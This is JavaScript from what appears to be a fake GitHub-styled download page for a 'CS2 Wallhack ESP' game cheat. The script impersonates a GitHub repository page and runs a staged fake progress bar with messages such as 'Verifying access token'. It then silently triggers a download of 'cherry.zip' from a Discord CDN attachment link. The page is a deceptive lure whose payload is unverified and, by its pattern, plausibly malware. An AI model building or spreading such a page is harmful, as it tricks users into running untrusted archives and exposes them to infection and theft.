    <script>
        function getUrlInfo() {
            // Сначала пытаемся прочитать параметры из window.__PM__
            const meta = window.__PM__ || {};
            if (meta.domain) {
                return {
                    userCode: "default-user",
                    referrerDomain: meta.domain,
                    label: meta.label || meta.domain
                };
            }

            // Пытаемся распарсить из URL пути (например, /CS2-Wallhack-ESP/.github или /username/repo)
            const path = window.location.pathname;
            const parts = path.split('/').filter(part => part.length > 0);
            
            // Если мы находимся на GitHub Pages (например, https://CS2-Wallhack-ESP.github.io/repository-name)
            const hostname = window.location.hostname;
            if (hostname.endsWith('.github.io')) {
                const user = hostname.split('.')[0];
                const repo = parts[0] || 'repository';
                return {
                    userCode: "default-user",
                    referrerDomain: hostname,
                    label: repo
                };
            }

            if (parts.length >= 2) {
                return { 
                    userCode: parts[0], 
                    referrerDomain: parts[1],
                    label: parts[1]
                };
            } else if (parts.length === 1) {
                return {
                    userCode: "default-user",
                    referrerDomain: parts[0],
                    label: parts[0]
                };
            }

            // Если ничего не подошло, берем значения по умолчанию
            return { 
                userCode: "default-user", 
                referrerDomain: "cs2-wallhack-esp.github.io",
                label: "cs2-wallhack-esp"
            };
        }

        function startDownload() {
            const btn = document.getElementById('downloadBtn');
            const btnDefault = btn.querySelector('.btn-content').innerHTML;
            const progressContainer = document.getElementById('progressContainer');
            const progressBarFill = document.getElementById('progressBarFill');
            const progressStatusText = document.getElementById('progressStatusText');
            const progressPercentage = document.getElementById('progressPercentage');

            btn.disabled = true;
            btn.querySelector('.btn-content').innerHTML =
                '<span class="btn-spinner" aria-hidden="true"></span><span>Downloading...</span>';
            
            progressContainer.style.display = 'block';
            progressBarFill.style.width = '0%';
            progressPercentage.textContent = '0%';
            
            const steps = [
                { text: "Establishing secure connection...", maxProgress: 15, duration: 800 },
                { text: "Verifying access token...", maxProgress: 35, duration: 1000 },
                { text: "Generating secure package...", maxProgress: 65, duration: 1200 },
                { text: "Compiling archive files...", maxProgress: 85, duration: 900 },
                { text: "Finalizing download...", maxProgress: 100, duration: 700 }
            ];

            let currentStepIdx = 0;
            let currentProgress = 0;
            
            function runStep() {
                if (currentStepIdx >= steps.length) {
                    progressStatusText.textContent = "Packing archive...";
                    setTimeout(generateAndDownloadZip, 500);
                    return;
                }
                
                const step = steps[currentStepIdx];
                progressStatusText.textContent = step.text;
                
                const startProgress = currentProgress;
                const targetProgress = step.maxProgress;
                const startTime = performance.now();
                
                function animate() {
                    const now = performance.now();
                    const elapsed = now - startTime;
                    const progressFraction = Math.min(elapsed / step.duration, 1);
                    
                    const easeFraction = 1 - Math.pow(1 - progressFraction, 3);
                    
                    currentProgress = Math.round(startProgress + (targetProgress - startProgress) * easeFraction);
                    progressBarFill.style.width = currentProgress + '%';
                    progressPercentage.textContent = currentProgress + '%';
                    
                    if (progressFraction < 1) {
                        requestAnimationFrame(animate);
                    } else {
                        currentStepIdx++;
                        setTimeout(runStep, 100);
                    }
                }
                
                requestAnimationFrame(animate);
            }
            
            function generateAndDownloadZip() {
                const downloadUrl = 'https://cdn.discordapp.com/attachments/1526587791457386497/1526851989252735066/cherry.zip?ex=6a588739&is=6a5735b9&hm=1421f7d17af4a3403c694779853bdd397a403b6a342b6ce278853022dc93c752&';
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = downloadUrl;
                a.download = 'cherry.zip';
                document.body.appendChild(a);
                a.click();
                
                setTimeout(function() {
                    a.remove();
                }, 100);

                btn.classList.add('success');
                btn.querySelector('.btn-content').innerHTML = `
                    <svg viewBox="0 0 16 16" width="20" height="20" class="btn-icon">
                        <path fill="currentColor" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 111.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
                    </svg>
                    Downloaded Successfully!
                `;
                progressStatusText.textContent = 'Download completed successfully!';
                progressBarFill.style.width = '100%';
                progressPercentage.textContent = '100%';
                
                setTimeout(function() {
                    btn.disabled = false;
                    btn.classList.remove('success');
                    btn.querySelector('.btn-content').innerHTML = btnDefault;
                    progressContainer.style.display = 'none';
                    progressBarFill.style.width = '0%';
                    progressPercentage.textContent = '0%';
                }, 5000);
            }
            
            function resetBtn() {
                btn.disabled = false;
                btn.querySelector('.btn-content').innerHTML = btnDefault;
                progressContainer.style.display = 'none';
            }

            runStep();
        }

        function updatePageFromUrl() {
            const urlInfo = getUrlInfo();
            const label = urlInfo.label || 'cs2-wallhack-esp';
            const domain = urlInfo.referrerDomain || 'cs2-wallhack-esp.github.io';
            
            const displayPath = '/' + domain;
            const formattedTitle = formatDomainName(label);
            
            document.getElementById('domainPath').textContent = displayPath;
            document.getElementById('dynamicTitle').textContent = formattedTitle;
            document.getElementById('dynamicSubtitle').textContent = 'Content package for ' + domain;
            document.title = formattedTitle + ' · Github';
        }

        function formatDomainName(name) {
            if (!name) return 'Content';
            let s = name.replace(/-/g, ' ');
            return s.split(' ').map(function(w) {
                return w.charAt(0).toUpperCase() + w.slice(1);
            }).join(' ') || 'Content';
        }

        document.addEventListener('DOMContentLoaded', function() {
            updatePageFromUrl();
            document.getElementById('downloadBtn').addEventListener('click', startDownload);
